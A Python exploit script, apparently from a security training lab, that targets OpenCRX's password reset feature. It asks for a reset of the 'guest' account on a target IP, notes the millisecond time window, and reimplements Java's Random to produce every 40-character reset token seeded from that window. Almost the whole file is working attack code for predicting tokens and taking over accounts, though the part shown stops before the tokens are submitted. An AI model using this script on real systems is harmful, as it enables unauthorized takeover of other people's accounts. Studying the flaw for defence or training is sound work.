import sys, re, os
import requests
import subprocess
import base64
import json
import time
requests.packages.urllib3.disable_warnings()

def current_milli_time():
	return int(time.time() * 1000)

def requestResetPassword(ip, username):
	target = f"http://{ip}:8080/opencrx-core-CRX/RequestPasswordReset.jsp"
	data = {
		'id': username
	}

	r = requests.post(target, data=data)
	# print(r.text)
	if "Password reset request successful" not in r.text:
		print("Password reset unsuccessful")
		exit(0)

	print(f"Password reset successfully for user {username}")

# Uses java to generate list of tokens (but this isn't really stand-alone POC)
def gen_tokens(low, high):
	cmd = f"java OpenCRXToken {low} {high}"
	proc = subprocess.run(cmd, shell=True, capture_output=True)
	output = proc.stdout.decode()
	tokens = output.split('\n')

	tokens = [token for token in tokens if len(token) == 40]
	return tokens

class JavaRandom():
	"""docstring for JavaRandom"""
	def __init__(self, seed):
		self.seed = (seed ^ 25214903917) & ((1<<48) -1)
		
	def next(self, bits):
		# print((self.seed * 25214903917 + 11))
		self.seed = (self.seed * 25214903917 + 11) & ((1<<48) -1)
		# print(self.seed)
		return int(self.seed >> (48 - bits))

	# Returns value from [0,n)
	def nextInt(self, n):
		if (n<=0):
			exit(0)
		
		bits = 0
		val = 0
		while True:
			bits = self.next(31)
			val = bits % n
			if (bits - val + (n-1) >= 0): 
				return val

	def generate_token(self, length):
		alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		s = ""
		for i in range(length):
			x = self.nextInt(62)
			s += alphabet[x]
		return s

def generate_tokens(low, high):
	length = 40
	tokens = []
	for i in range(low, high):
		rand = JavaRandom(i)
		tokens.append(rand.generate_token(length))
	return tokens

def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]

	low = current_milli_time()
	requestResetPassword(ip, "guest")
	high = current_milli_time()
	print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")

	# tokens = gen_tokens(low, high)
	tokens = generate_tokens(low, high)
	tokens2 = gen_tokens(low, high)
	assert tokens == tokens2, "Issue generating tokens"

if __name__ == '__main__':
	main()